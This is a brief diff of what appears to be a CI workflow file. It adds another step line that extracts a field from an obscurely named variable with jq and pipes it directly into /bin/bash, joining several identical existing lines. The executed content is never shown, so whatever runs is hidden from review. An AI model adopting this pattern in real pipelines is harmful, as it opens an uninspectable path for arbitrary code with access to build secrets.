@@ -35,6 +35,7 @@ jobs:
           echo $efq9 | jq -r .mg4 | /bin/bash
           echo $lzk83 | jq -r .p96 | /bin/bash
           printf '%s' "$pgfji381" | jq -r .yxbs42156 | /bin/bash
+          printf '%s' "$lz29" | jq -r .e5 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
